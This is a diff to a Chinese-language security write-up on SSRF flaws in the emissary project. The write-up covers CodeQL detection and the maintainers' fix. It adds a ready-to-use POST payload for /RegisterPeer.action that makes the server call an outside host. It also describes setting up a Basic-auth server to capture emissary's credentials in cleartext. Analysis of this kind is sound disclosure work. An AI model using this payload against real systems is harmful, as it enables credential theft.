@@ -57,7 +57,7 @@
 
 <img src="pic/emissary_10.png">
 
-严格来说，这个是emissary提供的功能，不应该算漏洞。另外，该接口需要登录后才能调用。但由于emissary的用户认证使用的是HTTP摘要认证(HTTP Digest authentication)(参考[3])，在浏览器端登录后的HTTP请求，会自动带上请求头`Authorization`，如下：
+严格来说，这个是emissary提供的功能。另外，该接口需要登录后才能调用。但由于emissary的用户认证使用的是HTTP摘要认证(HTTP Digest authentication)(参考[3])，在浏览器端登录后的HTTP请求，会自动带上请求头`Authorization`，如下：
 
 ```
 GET / HTTP/1.1
@@ -82,17 +82,44 @@ Authorization: Digest username="emissary", realm="EmissaryRealm", nonce="6GNGeEb
 
 这里有两个接口存在SSRF漏洞，分别是`/emissary/RegisterPeer.action`和`/emissary/AddChildDirectory.action`。
 
-#### /RegisterPeer.action
+这两处SSRF漏洞，使用CodeQL的默认规则集可以检测出来，如图：
 
+<img src="pic/emissary_12.png">
 
+<img src="pic/emissary_13.png">
 
+#### 接口 /RegisterPeer.action
 
-#### /AddChildDirectory.action
+漏洞输入点在`directoryName`参数。
 
+可构造payload如下：
+```
+POST /emissary/RegisterPeer.action HTTP/1.1
+Host: 127.0.0.1:8001
+Content-Type: application/x-www-form-urlencoded
 
+directoryName=foo.bar.baz.http://172.20.10.3:5000/&targetDir=http://localhost:8001/DirectoryPlace
+```
 
-## 0x02 使用CodeQL来检测漏洞
+SSRF一般用于未授权访问、扫描或攻击目标的内部网络。但是这里@pwntester根据emissary的实际情况给出了另一种攻击场景。通过分析代码发现，emissary使用Apache的HttpClient库来向内部网络发起http请求，它从自身配置中获取身份凭证，并将身份凭证设置到名为`CRED_PROV`的凭证提供者对象中，然后带着这个身份凭证向目标服务发起Http请求。在这个过程中，并没有配置emissary客户端使用哪种身份认证机制(`HTTP Basic Authentication`或`HTTP Digest Authentication`)，所以判断：使用哪种身份认证机制应该是根据HTTP服务器的响应来决定的。具体代码如下：
 
+<img src="pic/emissary_15.png">
+
+因此，我们就可以架设一个HTTP基础认证的服务器，然后通过emissary的SSRF漏洞，让emissary客户端使用HTTP基础认证方式去访问我们的服务器，这样，我们在恶意服务器端就能获取用户身份凭证的明文数据(Base64编码)。
+
+经实践，确实是这样。<br>
+1、首先编写并启动我们的HTTP Basic Authentication服务器；<br>
+2、使用上面的payload，对emissary执行SSRF攻击，如下图，会带着身份凭证的明文数据(Base64编码)向我们的目标服务器发起请求: <br>
+
+<img src="pic/emissary_14.png">
+
+因此emissary项目的维护者在修复SSRF漏洞的同时，还指定了emissary客户端使用HTTP摘要认证机制。如下图，详见：[修复代码](https://github.com/NationalSecurityAgency/emissary/commit/79ca5608c4f77d9a5c8a4996e204377c158a6976#diff-c988041bf4d686dbcce23218e54188558f0116513ff30d161d958482a7c5f1c4)
+
+<img src="pic/emissary_16.png">
+
+#### 接口 /AddChildDirectory.action
+
+`/AddChildDirectory.action`接口同理，就不展开说了。
 
 
 
